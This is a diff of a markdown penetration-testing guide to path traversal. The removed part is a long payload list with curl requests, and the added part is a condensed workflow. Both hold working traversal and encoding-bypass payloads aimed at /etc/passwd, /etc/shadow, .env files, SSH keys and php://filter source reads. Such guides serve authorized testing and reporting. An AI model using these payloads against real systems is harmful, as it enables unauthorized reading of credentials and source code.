@@ -1,325 +1,164 @@
 # Path Traversal
 
-## Common targets:
-- /etc/passwd
-- application source files
-- configuration files
-- Windows system files
-- web.config / .env / database configs
+## Why It Matters
 
+Path traversal lets an attacker escape the intended directory and access files elsewhere on the system. Depending on the application behavior, this can lead to:
 
-## 1. Basic Testing
+- local file read
+- source disclosure
+- credential exposure
+- inclusion-style escalation
+- arbitrary file write in related contexts such as upload handling
 
-## Typical vulnerable parameters
+## Recognition Cues
 
+Look for parameters such as:
+
+```text
+page=
+file=
+path=
+template=
+download=
+doc=
 ```
-?page=
-?file=
-?path=
-?template=
-?download=
-?doc=
-```
 
-#### Example:
+Strong hints:
 
-```
+- file download features
+- image or document retrieval
+- template selection
+- errors leaking filesystem paths
+
+## Workflow
+
+1. identify a file-selection parameter
+2. test straightforward traversal
+3. try absolute paths and encoding bypasses
+4. pull a safe proof file first
+5. determine whether the issue stops at file read or can chain into inclusion or write abuse
+
+## Step 1: Basic Traversal
+
+Example:
+
+```text
 GET /download?file=report.pdf
-```
-
-#### Test:
-
-```
 GET /download?file=../../../../etc/passwd
 ```
 
+Useful Linux targets:
 
-## 2. Basic Traversal Payloads
+- `/etc/passwd`
+- `/etc/hosts`
+- application source files
+- `.env` and config files
 
-### Linux
+Useful Windows targets:
 
-```
-../
-../../
-../../../
-../../../../
-```
+- `C:\Windows\win.ini`
+- `C:\Windows\System32\drivers\etc\hosts`
+- `C:\inetpub\web.config`
 
-#### Target:
+## Step 2: Absolute Paths
 
-```
-../../../../etc/passwd
-../../../../etc/hosts
-../../../../var/www/html/index.php
-```
+If traversal sequences are blocked, try absolute paths:
 
-
-### Windows
-
-```
-..\ 
-..\..\ 
-..\..\..\ 
-```
-
-#### Target:
-
-```
-..\..\..\windows\win.ini
-..\..\..\windows\system32\drivers\etc\hosts
-```
-
-
-## 3. Absolute Path Bypass
-
-If traversal blocked, try absolute paths:
-
-### Linux
-
-```
+```text
 /etc/passwd
 /var/www/html/index.php
-```
-
-### Windows
-
-```
-C:\windows\win.ini
+C:\Windows\win.ini
 C:\inetpub\web.config
 ```
 
+## Step 3: Bypass Variants
 
-## 4. Encoding Bypasses
+If the app filters `../`, test:
 
-If `../` blocked, try encoding.
-
-### URL Encoding
-
-```
+```text
 %2e%2e%2f
-%2e%2e/
-..%2f
-%2e%2e/
-```
-
-### Example:
-
-```
-%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-```
-
----
-
-### Double Encoding
-
-```
 %252e%252e%252f
-```
-
-
-### UTF-8 Encoding
-
-```
-%c0%ae%c0%ae%c0%af
-```
-
-## 5. Mixed Traversal Variants
-
-```
 ....//
-....\/
-..../
-..././
-.././
-```
-
-### Example:
-
-```
-....//....//....//etc/passwd
-```
-
----
-
-## 6. Null Byte Injection (Older Systems)
-
-```
+..%2f
 ../../../../etc/passwd%00
-```
-
-### Used when extension is appended:
-
-```
-?page=../../../../etc/passwd%00.php
-```
-
-## 7. Bypass Extension Filters
-
-### If app appends `.php`:
-
-```
-?page=../../../../etc/passwd
-```
-
-#### Try:
-
-```
-?page=../../../../etc/passwd%00
-```
-
-### If filter blocks `.php`:
-
-```
-?page=../../../../etc/passwd/.
-```
-
-### Or:
-
-```
-?page=../../../../etc/passwd%00.jpg
-```
-
-## 8. Filter Bypass Tricks
-
-### Add trailing slash
-
-```
-../../../../etc/passwd/
-```
-
-### Add dot
-
-```
 ../../../../etc/passwd/.
 ```
 
-### Add extra traversal
+These are useful when:
 
-```
-../../../../../../../../etc/passwd
-```
+- filtering is incomplete
+- normalization happens in the wrong order
+- extension appending is involved
 
-## 9. Testing with curl
+## Extension And Suffix Tricks
 
-```
-curl "http://target/download?file=../../../../etc/passwd"
-```
+If the app appends a suffix such as `.php`, try:
 
-### With encoding:
-
-```
-curl "http://target/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
-```
-
-# 10. Burp Workflow
-
-1. Intercept request
-2. Send to Repeater
-3. Replace filename with traversal payload
-4. Compare response length
-5. Look for:
-   - passwd format (root:x:0:0:)
-   - Windows config format
-   - HTML source code
-   - error messages revealing paths
-
-## 11. Common Target Files
-
-### Linux
-
-```
-/etc/passwd
-/etc/shadow
-/etc/hosts
-/proc/self/environ
-/var/www/html/index.php
-/home/user/.ssh/id_rsa
-```
-
-### Windows
-
-```
-C:\windows\win.ini
-C:\windows\system32\drivers\etc\hosts
-C:\inetpub\web.config
-C:\xampp\apache\conf\httpd.conf
-```
-
-## 12. LFI Combination
-
-### If file included via:
-
-```
-?page=
-```
-
-#### Try:
-
-```
-?page=../../../../etc/passwd
-?page=php://filter/convert.base64-encode/resource=index.php
-```
-
-Decode output.
-
-## 13. Traversal in File Upload Context
-
-### If file name used insecurely:
-
-```
-filename=../../shell.php
-```
-
-May allow writing outside intended directory.
-
-
-## Full Payload Block 
-
-```
-../../../../etc/passwd
-../../../../../etc/passwd
-../../../../../../etc/passwd
-../../../../../../../../etc/passwd
-
-..\..\..\..\windows\win.ini
-..\..\..\..\windows\system32\drivers\etc\hosts
-
-/../../../../etc/passwd
-/../../../etc/passwd
-/etc/passwd
-C:\windows\win.ini
-
-../../../../etc/passwd/
-../../../../etc/passwd/.
+```text
 ../../../../etc/passwd%00
-../../../../etc/passwd%00.php
-../../../../etc/passwd%00.jpg
+../../../../etc/passwd/.
+```
 
-....//....//....//etc/passwd
-....\/....\/....\/etc/passwd
-..././..././..././etc/passwd
-.././.././.././etc/passwd
+This matters mostly in older or poorly implemented handling code.
 
-..%2f..%2f..%2f..%2fetc/passwd
-%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+## Burp And Manual Validation
 
-%252e%252e%252f%252e%252e%252fetc/passwd
+When testing, compare:
 
-%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
+- response size
+- response structure
+- clear file markers such as `root:x:0:0:`
+- disclosed path fragments
 
-..\\..\\..\\..\\windows\\win.ini
-%2e%2e\\%2e%2e\\windows\\win.ini
+Do not assume success from a status code alone.
 
-../../../../var/www/html/index.php
-../../../../proc/self/environ
-../../../../etc/hosts
+## Where Traversal Leads Next
 
-?page=../../../../etc/passwd
-?file=../../../../etc/passwd
-?path=../../../../etc/passwd
-?template=../../../../etc/passwd
-?download=../../../../etc/passwd
+After confirming file read, prioritize:
 
-?page=php://filter/convert.base64-encode/resource=index.php
+- app source
+- database configs
+- `.env`
+- credentials
+- SSH keys
+- logs
+
+If the parameter truly includes rather than only reads files, this may overlap with LFI.
+
+## Related Write Scenarios
+
+Traversal also appears in:
+
+- file upload destination handling
+- archive extraction
+- export or backup path selection
+
+In those cases, the impact may become arbitrary file write rather than read.
+
+## Pitfalls
+
+- treating every filesystem error as confirmed traversal
+- using only one traversal style
+- pulling low-value files when config and source files would prove more
+- missing Windows-style paths on Windows-backed apps
+
+## Reporting Notes
+
+Capture:
+
+- the vulnerable parameter
+- the successful traversal form
+- the file(s) accessed
+- whether source, config, or secrets were exposed
+- any related escalation path such as inclusion or write impact
+
+## Fast Checklist
+
+```text
+1. Find a file-selection parameter
+2. Prove traversal with a safe target file
+3. Try encoding and suffix bypasses
+4. Pull source or config files next
+5. Check whether the issue chains into LFI or file write
+6. Save the request and file output
 ```
